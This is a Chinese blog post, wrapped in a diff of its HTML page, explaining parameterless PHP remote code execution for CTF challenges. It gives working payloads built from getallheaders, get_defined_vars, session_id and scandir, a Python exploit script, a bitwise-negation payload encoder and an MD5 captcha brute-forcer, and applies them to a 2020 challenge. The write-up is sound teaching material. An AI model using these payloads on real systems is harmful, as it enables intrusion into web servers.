@@ -1,0 +1,618 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>PHP无参数RCE - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="PHP无参数RCE">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-08 22:25" pubdate>
+        August 8, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PHP无参数RCE</h1>
+            
+            <div class="markdown-body">
+              <p>之前无数字字母shell里只做到了<code>/[A-Za-z0-9_$]+/</code>这样的限制，但是遇到的其他题目做了很多限制，之前的绕过就行不通，比如像这样的：</p>
+<pre><code class="hljs gherkin">/[A-Za-z0-9]|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">&quot;</span>|<span class="hljs-string">`</span>|<span class="hljs-string">\ </span>|<span class="hljs-string">,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">=</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">\\</span>|<span class="hljs-string">&lt;</span>|<span class="hljs-string">&gt;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">&amp;</span>|<span class="hljs-string">\</span>|<span class="hljs-string">/，</span></code></pre>
+<p>就只能无参RCE了。</p>
+<h2 id="demo"><a class="header-anchor" href="#demo">🍭</a>demo</h2>
+<pre><code class="hljs autoit"><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;
+    <span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>])<span class="hljs-comment">;</span></code></pre>
+<blockquote>
+<p>(?R)引用当前表达式，?递归调用，\W匹配非单词字符</p>
+</blockquote>
+<p>先用工具测试一下</p>
+<p><img src="/2021/08/08/cmd/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>满足格式，开始构造payload。</p>
+<h2 id="payload"><a class="header-anchor" href="#payload">🍭</a>payload</h2>
+<h5 id="getenv"><a class="header-anchor" href="#getenv">🍭</a>getenv()</h5>
+<img src="/2021/08/08/cmd/4.png" srcset="/img/loading.gif" alt="4" style="zoom: 50%;">
+<pre><code class="hljs lisp">var_dump(<span class="hljs-name">getenv</span>(<span class="hljs-name">phpinfo</span>()))<span class="hljs-comment">;</span></code></pre>
+<p>getenv() 获取一个环境变量的值，phpinfo() 获取全部的环境变量，（但是直接phpinfo()好像一样）</p>
+<p>测试一下：</p>
+<p><img src="/2021/08/08/cmd/6.png" srcset="/img/loading.gif" alt="6"></p>
+<h5 id="getallheaders"><a class="header-anchor" href="#getallheaders">🍭</a>getallheaders()</h5>
+<pre><code class="hljs lisp">eval(<span class="hljs-name">end</span>(<span class="hljs-name">getallheaders</span>()))<span class="hljs-comment">;</span></code></pre>
+<p>end() 将数组的内部指针移到最后一个，getallheaders() 获取所有的http请求头。</p>
+<p>测试一下demo：</p>
+<img src="/2021/08/08/cmd/5.png" srcset="/img/loading.gif" alt="5" style="zoom:67%;">
+<p>但是在bp里新建一个响应头好像不行（如下面的例题），这时候可以尝试修改ua头，将end改成next；</p>
+<h5 id="get-defined-vars"><a class="header-anchor" href="#get-defined-vars">🍭</a>get_defined_vars()</h5>
+<pre><code class="hljs lisp">eval(<span class="hljs-name">end</span>(<span class="hljs-name">current</span>(<span class="hljs-name">get_defined_vars</span>())))<span class="hljs-comment">;&amp;jiang=phpinfo();</span></code></pre>
+<p><strong><code>get_defined_vars()</code><strong>返回由所有已定义变量所组成的数组，会返回</strong><code>$_GET,$_POST,$_COOKIE,$_FILES</code><strong>全局变量的值,返回数组顺序为</strong><code>get-&gt;post-&gt;cookie-&gt;files</code></strong>，<strong><code>current()</code></strong> 返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回**<code>$_GET</code>**变量的数组值。当需要的值是<code>$post</code>时把<code>current</code> 改成<code>next</code> 即可。</p>
+<p>而如果网站对<code>$_GET,$_POST,$_COOKIE</code>都做的过滤， 那我们只能从<code>$_FILES</code>入手了，exp：</p>
+<pre><code class="hljs routeros">import requests
+def str2hex(payload):
+  txt = <span class="hljs-string">&#x27;&#x27;</span>
+  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:
+      txt += hex(ord(i))[-2:]
+  return txt
+payload = str2hex(<span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>)
+files = &#123;
+    payload: b<span class="hljs-string">&#x27;extrader&#x27;</span>
+&#125;
+r = requests.post(<span class="hljs-string">&quot;http://xxx/index.php?exp=eval(hex2bin(array_rand(end(get_defined_vars()))));&quot;</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)  # <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span> 禁用重定向处理
+<span class="hljs-builtin-name">print</span>(r.content.decode())</code></pre>
+<blockquote>
+<p>**array_rand()：<strong>从数组中随机取出一个或多个单元，如果只取出一个，</strong><code>array_rand()</code>**返回随机单元的键名。 否则就返回包含随机键名的数组</p>
+</blockquote>
+<h5 id="session-start"><a class="header-anchor" href="#session-start">🍭</a>session_start()</h5>
+<pre><code class="hljs reasonml">show<span class="hljs-constructor">_source(<span class="hljs-params">session_id</span>(<span class="hljs-params">session_start</span>()</span>));
+var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-params">session_id</span>(<span class="hljs-params">session_start</span>()</span>)))
+highlight<span class="hljs-constructor">_file(<span class="hljs-params">session_id</span>(<span class="hljs-params">session_start</span>()</span>));
+readfile(session<span class="hljs-constructor">_id(<span class="hljs-params">session_start</span>()</span>)); 或者readgzfile<span class="hljs-literal">()</span>;
+#修改cookie : PHPSESSID= filename</code></pre>
+<p>or</p>
+<pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>(hex2bin(session_id(session_start())))<span class="hljs-comment">;</span>
+<span class="hljs-meta">#抓包传入Cookie: PHPSESSID=(<span class="hljs-string">&quot;system(&#x27;命令&#x27;)&quot;</span>的十六进制)</span></code></pre>
+<p>测试：<img src="/2021/08/08/cmd/9.png" srcset="/img/loading.gif" alt="9"></p>
+<h5 id="scandir"><a class="header-anchor" href="#scandir">🍭</a>scandir()</h5>
+<p>读取文件</p>
+<pre><code class="hljs reasonml">当前目录：highlight<span class="hljs-constructor">_file(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">getcwd</span>()</span>))));
+上级目录文件：highlight<span class="hljs-constructor">_file(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">dirname</span>(<span class="hljs-params">chdir</span>(<span class="hljs-params">dirname</span>(<span class="hljs-params">getcwd</span>()</span>)))))));
+#随机获取</code></pre>
+<p>可以配合 数组的指针，倒序，等各种方式找到我们需要的文件：</p>
+<ul>
+<li>
+<p><strong>getchwd()</strong> ：函数返回当前工作目录。</p>
+</li>
+<li>
+<p><strong>scandir()</strong> ：函数返回指定目录中的文件和目录的数组。</p>
+</li>
+<li>
+<p><strong>dirname()</strong> ：函数返回路径中的目录部分。</p>
+</li>
+<li>
+<p><strong>chdir()</strong> ：函数改变当前的目录。</p>
+</li>
+<li>
+<p><strong>array_flip()</strong>：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 <strong><code>NULL</code></strong>。</p>
+</li>
+<li>
+<p><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。</p>
+</li>
+</ul>
+<blockquote>
+<p>array_flip()和array_rand()配合使用可随机返回当前目录下的文件名</p>
+</blockquote>
+<blockquote>
+<p>dirname(chdir(dirname()))配合切换文件路径</p>
+</blockquote>
+<blockquote>
+<p>current(localeconv())：</p>
+<blockquote>
+<p>localeconv()：返回一包含本地数字及货币格式信息的数组,数组第一项就是小数点字符(过滤该字符时可用)</p>
+</blockquote>
+</blockquote>
+<p>还有一系列函数：<strong>floor()</strong>：舍去法取整，<strong>sqrt()</strong>：平方根，<strong>tan()</strong>：正切值，<strong>cosh()</strong>：双曲余弦，<strong>sinh()</strong>：双曲正弦，<strong>ceil()</strong>：进一法取整。可以组合使用：</p>
+<ul>
+<li><code>phpversion()</code></li>
+<li><code>floor(phpversion())</code></li>
+<li><code>sqrt(floor(phpversion()))</code></li>
+<li><code>tan(floor(sqrt(floor(phpversion()))))</code></li>
+<li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code></li>
+<li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code></li>
+<li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code></li>
+<li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li>
+<li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li>
+<li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li>
+</ul>
+<h5 id="数组操作"><a class="header-anchor" href="#数组操作">🍭</a>数组操作</h5>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> ： 将内部指针指向数组中的最后一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> ：将内部指针指向数组中的下一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> ：将内部指针指向数组中的上一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> ： 将内部指针指向数组中的第一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> ： 返回当前元素的键名和键值，并将内部指针向前移动</li>
+</ul>
+<h2 id="极客大挑战-2020-Roamphp4-Rceme"><a class="header-anchor" href="#极客大挑战-2020-Roamphp4-Rceme">🍭</a>[极客大挑战 2020]Roamphp4-Rceme</h2>
+<p>在控制台里看到提示</p>
+<img src="/2021/08/08/cmd/1.png" srcset="/img/loading.gif" alt="1" style="zoom:67%;">
+<p>.index.php.swp 可以获取源码：</p>
+<p><img src="/2021/08/08/cmd/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>有乱码，用vim恢复：</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+session_start();
+<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;
+    $_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);
+&#125;
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;
+
+    <span class="hljs-keyword">if</span>(substr(md5($_POST[<span class="hljs-string">&#x27;code&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>) !== $_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>])&#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);
+    &#125;
+    $_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);
+    $code = $_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>];
+    <span class="hljs-keyword">if</span>(strlen($code) &gt; <span class="hljs-number">70</span> <span class="hljs-keyword">or</span> preg_match(<span class="hljs-string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,$code))&#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);
+    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $code))&#123;
+        @<span class="hljs-keyword">eval</span>($code);
+        <span class="hljs-keyword">die</span>();
+    &#125;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>字符长度有限制，过滤很多符号</p>
+<pre><code class="hljs gherkin">/[A-Za-z0-9]|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">&quot;</span>|<span class="hljs-string">`</span>|<span class="hljs-string">\ </span>|<span class="hljs-string">,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">=</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">\\</span>|<span class="hljs-string">&lt;</span>|<span class="hljs-string">&gt;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">&amp;</span>|<span class="hljs-string">\</span>|<span class="hljs-string">/，</span></code></pre>
+<p>过滤了 异或 ，或；取反还在，只能无参RCE了,测试一下：</p>
+<img src="/2021/08/08/cmd/10.png" srcset="/img/loading.gif" alt="10" style="zoom: 67%;">
+<p>符合，用脚本生成</p>
+<pre><code class="hljs livecodeserver">def <span class="hljs-literal">one</span>(s):
+    ss = <span class="hljs-string">&quot;&quot;</span>
+    <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">in</span> s:
+        ss += <span class="hljs-string">&quot;%&quot;</span> + str(hex(<span class="hljs-number">255</span> - ord(<span class="hljs-keyword">each</span>)))[<span class="hljs-number">2</span>:].<span class="hljs-built_in">upper</span>()
+    <span class="hljs-literal">return</span> f<span class="hljs-string">&quot;[~&#123;ss&#125;][!%FF](&quot;</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
+    <span class="hljs-keyword">a</span> = input(<span class="hljs-string">&quot;:&gt;&quot;</span>).strip(<span class="hljs-string">&quot;)&quot;</span>)
+    aa = <span class="hljs-keyword">a</span>.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;(&quot;</span>)
+    s = <span class="hljs-string">&quot;&quot;</span>
+    <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">in</span> aa[:<span class="hljs-number">-1</span>]:
+        s += <span class="hljs-literal">one</span>(<span class="hljs-keyword">each</span>)
+    s += <span class="hljs-string">&quot;)&quot;</span> * (<span class="hljs-built_in">len</span>(aa) - <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;;&quot;</span>
+    print(s)</code></pre>
+<p>payload</p>
+<pre><code class="hljs lisp">system(<span class="hljs-name">next</span>(<span class="hljs-name">getallheaders</span>()))<span class="hljs-comment">;</span></code></pre>
+<p>题目传cmd同时会随机对code做出限制</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">if</span>:substr(md<span class="hljs-number">5</span>($code),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)==<span class="hljs-number">69622</span></code></pre>
+<p>值每次不同，需要爆破</p>
+<pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">hashlib</span>
+
+<span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">9999999</span>):</span>
+<span class="hljs-function">    <span class="hljs-variable">md5_ins</span> = <span class="hljs-variable">hashlib.md5</span>((<span class="hljs-title">str</span>(<span class="hljs-variable">i</span>)).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span>
+    <span class="hljs-variable">a</span>=<span class="hljs-variable">md5_ins.hexdigest</span>()
+    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">a</span>[:<span class="hljs-number">5</span>] == <span class="hljs-string">&quot;69622&quot;</span>:
+        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span>
+        <span class="hljs-variable">break</span></code></pre>
+<p>编码，抓包，执行</p>
+<img src="/2021/08/08/cmd/8.png" srcset="/img/loading.gif" alt="8">
+<p>读取</p>
+<p><img src="/2021/08/08/cmd/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://github.com/WAY29/geek-2020-challenges/tree/main/roamphp4-rceme">https://github.com/WAY29/geek-2020-challenges/tree/main/roamphp4-rceme</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%97%A0%E5%8F%82RCE/">无参RCE</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/shell/">shell</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/07/hate/">
+                        <span class="hidden-mobile">buu（七）</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
